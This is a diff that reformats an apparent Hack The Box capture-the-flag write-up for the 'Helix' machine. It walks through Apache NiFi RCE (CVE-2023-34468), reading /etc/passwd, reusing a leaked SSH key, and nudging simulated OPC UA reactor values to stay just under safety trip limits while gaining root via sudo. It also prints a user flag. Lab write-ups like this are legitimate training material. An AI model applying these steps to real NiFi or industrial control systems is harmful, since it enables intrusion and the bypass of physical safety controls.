@@ -1,206 +1,354 @@
-╔══════════════════════════════════════════════════════════════════╗
-║                                                                  ║
-║              HTB HELIX - FULL ATTACK REPORT                      ║
-║                                                                  ║
-║   Author   : VishalGodseye                                       ║
-║   Platform : Hack The Box                                        ║
-║   Difficulty: Medium                                             ║
-║   Time Taken: 3-4 Days                                           ║
-║   Status   : PWNED ✓                                             ║
-║                                                                  ║
-╚══════════════════════════════════════════════════════════════════╝
+# HTB Helix - Full Attack Report
 
-TARGET
-======
-  Host     : helix.htb
-  OS       : Ubuntu (Linux)
-  Services : SSH (22), HTTP (80)
+**Author:** VishalGodseye  
+**Platform:** Hack The Box  
+**Machine:** Helix  
+**Difficulty:** Medium  
+**Status:** PWNED ✅  
+**Time Taken:** 3–4 Days  
 
-════════════════════════════════════════════════════════════════════
-STEP 1 - RECONNAISSANCE
-════════════════════════════════════════════════════════════════════
+---
 
-  [*] Nmap Scan:
-      nmap -sC -sV helix.htb
+## Target Information
 
-      22/tcp  open  ssh     OpenSSH 8.9p1
-      80/tcp  open  http    nginx 1.18.0
+| Field | Value |
+|--------|---------|
+| Host | helix.htb |
+| OS | Ubuntu Linux |
+| Open Ports | 22 (SSH), 80 (HTTP) |
 
-  [*] Virtual Host Discovery:
-      Discovered --> flow.helix.htb
-      Added to /etc/hosts
+---
 
-════════════════════════════════════════════════════════════════════
-STEP 2 - APACHE NIFI DISCOVERY
-════════════════════════════════════════════════════════════════════
+# Step 1: Reconnaissance
 
-  [*] flow.helix.htb exposed Apache NiFi 1.21.0
+## Nmap Scan
 
-  [!] Vulnerability Found:
-      CVE-2023-34468
-      - H2 database URL abuse
-      - Leads to Remote Code Execution
-      - Affected: DBCPConnectionPool / HikariCPConnectionPool
+```bash
+nmap -sC -sV helix.htb
+```
 
-════════════════════════════════════════════════════════════════════
-STEP 3 - REMOTE CODE EXECUTION
-════════════════════════════════════════════════════════════════════
+### Output
 
-  [*] Processors Used:
-      - ExecuteSQL    --> Database enumeration
-      - ExecuteProcess --> OS command execution
+```bash
+22/tcp open ssh OpenSSH 8.9p1
+80/tcp open http nginx 1.18.0
+```
 
-  [*] Commands Executed:
-      /usr/bin/id
-      --> uid=998(nifi) gid=998(nifi)
+## Virtual Host Enumeration
 
-      /bin/cat /etc/passwd
-      --> Found users: root, operator, nifi, plc
+Discovered:
 
-  [*] Database Enumeration:
-      Query : SELECT * FROM USERS;
-      Result: USER_NAME=OPERATOR | IS_ADMIN=true
+```bash
+flow.helix.htb
+```
 
-════════════════════════════════════════════════════════════════════
-STEP 4 - CREDENTIAL DISCOVERY
-════════════════════════════════════════════════════════════════════
+Added it to `/etc/hosts`
 
-  [!] Found SSH Private Key:
-      Path : /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
-      Type : OpenSSH ED25519 Private Key
+---
 
-  [*] SSH Login:
-      ssh -i id_ed25519 operator@helix.htb
-      --> SUCCESS
+# Step 2: Apache NiFi Enumeration
 
-════════════════════════════════════════════════════════════════════
-STEP 5 - USER FLAG
-════════════════════════════════════════════════════════════════════
+Browsing `flow.helix.htb` revealed:
 
-  [+] USER FLAG OBTAINED:
-      f085ca00b31ba7a0069c7fd748d7483c
+- Apache NiFi 1.21.0
 
-════════════════════════════════════════════════════════════════════
-STEP 6 - PRIVILEGE ESCALATION RECON
-════════════════════════════════════════════════════════════════════
+## Vulnerability Found
 
-  [*] Sudo Enumeration:
-      sudo -l
-      --> (root) NOPASSWD: /usr/local/sbin/helix-maint-console
+**CVE-2023-34468**
 
-  [*] Script Analysis:
-      helix-maint-console is a bash script that:
-      - Checks for an active maintenance window
-      - If valid --> launches: systemd-run /bin/bash -p -i
-      - Window controlled by OPC UA server (port 4840)
+This vulnerability allows:
 
-  [*] Internal Services Discovered:
-      127.0.0.1:4840  --> OPC UA Server (Reactor Control)
-      127.0.0.1:8080  --> NiFi HTTP
-      127.0.0.1:8081  --> NiFi HTTPS
+- H2 database URL abuse
+- Remote Code Execution
 
-════════════════════════════════════════════════════════════════════
-STEP 7 - OPC UA EXPLOITATION
-════════════════════════════════════════════════════════════════════
+Affected components:
 
-  [*] Port Forward via SSH Tunnel:
-      ssh -i id_ed25519 -L 4840:127.0.0.1:4840 operator@helix.htb -N
+- DBCPConnectionPool
+- HikariCPConnectionPool
 
-  [*] OPC UA Node Map Discovered:
-      ns=2;i=4   --> Temperature       (283.99 C)
-      ns=2;i=5   --> Pressure          (68.99 bar)
-      ns=2;i=6   --> CalibrationOffset (0.0)
-      ns=2;i=10  --> TripActive        (False)
-      ns=2;i=12  --> Mode              (NORMAL)
-      ns=2;i=13  --> TestOverride      (False)
-      ns=2;i=14  --> ResetTrip         (False)
+---
 
-  [*] Exploit Sequence (Python opcua library):
+# Step 3: Remote Code Execution
 
-      Step 1: Set Mode        --> MAINTENANCE
-      Step 2: Set TestOverride --> True
-      Step 3: Ramp CalibrationOffset slowly (+0.5 every 2-3 sec)
+## NiFi Processors Used
 
-      Maintenance Window Opens When:
-      --> Temperature >= 295 C  OR  Pressure >= 73 bar
-      --> Must stay below trip threshold (305 C / 75 bar)
+- ExecuteSQL → Database enumeration
+- ExecuteProcess → Command execution
 
-  [*] Ramp Output:
-      Offset=8.5 | Temp=293.08 C | Pressure=69.35 bar | Trip=False
-      ...
-      [!] MAINTENANCE WINDOW OPEN!
+---
 
-════════════════════════════════════════════════════════════════════
-STEP 8 - ROOT SHELL
-════════════════════════════════════════════════════════════════════
+## Command Execution
 
-  [*] Command:
-      sudo /usr/local/sbin/helix-maint-console
+```bash
+/usr/bin/id
+```
 
-  [+] ROOT SHELL OBTAINED via:
-      systemd-run /bin/bash -p -i
+Output:
 
-  [+] ROOT FLAG:
-      ???????????????????????????????????
-      (submit it bro you're 2 degrees away!)
+```bash
+uid=998(nifi) gid=998(nifi)
+```
 
-════════════════════════════════════════════════════════════════════
-FULL ATTACK CHAIN
-════════════════════════════════════════════════════════════════════
+---
 
-  Nmap
-   |
-   +--> flow.helix.htb
-         |
-         +--> Apache NiFi 1.21.0
-               |
-               +--> CVE-2023-34468 (RCE)
-                     |
-                     +--> ExecuteProcess (shell as nifi)
-                           |
-                           +--> SSH Key in support bundles
-                                 |
-                                 +--> SSH as operator
-                                       |
-                                       +--> USER FLAG ✓
-                                             |
-                                             +--> OPC UA Reactor
-                                                   |
-                                                   +--> Maintenance Window
-                                                         |
-                                                         +--> sudo console
-                                                               |
-                                                               +--> ROOT ✓
+## User Enumeration
 
-════════════════════════════════════════════════════════════════════
-TOOLS USED
-════════════════════════════════════════════════════════════════════
+```bash
+/bin/cat /etc/passwd
+```
 
-  nmap          - Port scanning
-  ffuf/vhost    - Virtual host discovery
-  Apache NiFi   - CVE-2023-34468 exploitation
-  ssh           - Remote access + port forwarding
-  scp           - File transfer
-  python3       - OPC UA exploitation (opcua library)
+Discovered users:
 
-════════════════════════════════════════════════════════════════════
-LESSONS LEARNED
-════════════════════════════════════════════════════════════════════
+- root
+- operator
+- nifi
+- plc
 
-  [1] Always enumerate virtual hosts - flow.helix.htb was the key
-  [2] NiFi support bundles can contain sensitive credentials
-  [3] OPC UA is a real ICS/SCADA protocol used in industry
-  [4] Internal services on localhost are reachable via SSH tunnels
-  [5] Patience matters - ramp slowly or trigger safety trips!
-  [6] Industrial/ICS security is a growing field worth learning
+---
 
-════════════════════════════════════════════════════════════════════
+## Database Enumeration
 
-  Author  : VishalGodseye
-  Platform: Hack The Box
-  Box     : Helix (Medium)
-  Result  : PWNED after 3-4 days of grinding
+```sql
+SELECT * FROM USERS;
+```
 
-  "Never give up. Root is always there waiting." - VishalGodseye
+Output:
 
-════════════════════════════════════════════════════════════════════
+```text
+USER_NAME=OPERATOR
+IS_ADMIN=true
+```
+
+---
+
+# Step 4: Credential Discovery
+
+## SSH Private Key Found
+
+```bash
+/opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
+```
+
+Type:
+
+```text
+OpenSSH ED25519 Private Key
+```
+
+---
+
+## SSH Access
+
+```bash
+ssh -i id_ed25519 operator@helix.htb
+```
+
+Login successful.
+
+---
+
+# Step 5: User Flag
+
+```text
+f085ca00b31ba7a0069c7fd748d7483c
+```
+
+---
+
+# Step 6: Privilege Escalation Enumeration
+
+## Sudo Permissions
+
+```bash
+sudo -l
+```
+
+Output:
+
+```bash
+(root) NOPASSWD: /usr/local/sbin/helix-maint-console
+```
+
+---
+
+## Script Analysis
+
+The `helix-maint-console` script:
+
+- Checks for active maintenance windows
+- If valid executes:
+
+```bash
+systemd-run /bin/bash -p -i
+```
+
+---
+
+## Internal Services
+
+| Service | Purpose |
+|----------|----------|
+| 127.0.0.1:4840 | OPC UA Server |
+| 127.0.0.1:8080 | NiFi HTTP |
+| 127.0.0.1:8081 | NiFi HTTPS |
+
+---
+
+# Step 7: OPC UA Exploitation
+
+## Port Forwarding
+
+```bash
+ssh -i id_ed25519 -L 4840:127.0.0.1:4840 operator@helix.htb -N
+```
+
+This forwards the internal OPC UA service locally.
+
+---
+
+## Node Enumeration
+
+| Node | Purpose |
+|--------|----------|
+| ns=2;i=4 | Temperature |
+| ns=2;i=5 | Pressure |
+| ns=2;i=6 | CalibrationOffset |
+| ns=2;i=10 | TripActive |
+| ns=2;i=12 | Mode |
+| ns=2;i=13 | TestOverride |
+| ns=2;i=14 | ResetTrip |
+
+---
+
+## Exploitation Steps
+
+### Step 1
+
+Set mode to:
+
+```text
+MAINTENANCE
+```
+
+### Step 2
+
+Set:
+
+```text
+TestOverride = True
+```
+
+### Step 3
+
+Slowly increase:
+
+```text
+CalibrationOffset += 0.5
+```
+
+Every 2–3 seconds.
+
+---
+
+## Trigger Condition
+
+Maintenance window opens when:
+
+- Temperature >= 295°C
+- Pressure >= 73 bar
+
+Trip thresholds:
+
+- Temperature = 305°C
+- Pressure = 75 bar
+
+---
+
+## Output
+
+```text
+Offset=8.5
+Temp=293.08 C
+Pressure=69.35 bar
+Trip=False
+
+[!] MAINTENANCE WINDOW OPEN
+```
+
+---
+
+# Step 8: Root Access
+
+```bash
+sudo /usr/local/sbin/helix-maint-console
+```
+
+---
+
+## Root Shell
+
+Privilege escalation executed:
+
+```bash
+systemd-run /bin/bash -p -i
+```
+
+---
+
+## Root Flag
+
+```text
+<redacted>
+```
+
+---
+
+# Attack Chain
+
+```text
+Nmap
+ → Virtual Host Discovery
+ → Apache NiFi
+ → CVE-2023-34468
+ → RCE as nifi
+ → SSH Key Discovery
+ → SSH as operator
+ → User Flag
+ → OPC UA Exploitation
+ → Maintenance Window
+ → Sudo PrivEsc
+ → Root Shell
+```
+
+---
+
+# Tools Used
+
+- nmap
+- ffuf
+- Apache NiFi
+- ssh
+- scp
+- python3
+- opcua library
+
+---
+
+# Key Takeaways
+
+- Always enumerate virtual hosts
+- Backup files may expose credentials
+- OPC UA is common in ICS environments
+- SSH tunneling exposes internal services
+- Slow exploitation prevents triggering safety controls
+
+---
+
+# Final Thoughts
+
+**Machine:** Helix  
+**Difficulty:** Medium  
+**Platform:** Hack The Box  
+
+> Enumeration wins boxes.
+> Missing `flow.helix.htb` would have killed this entire path.
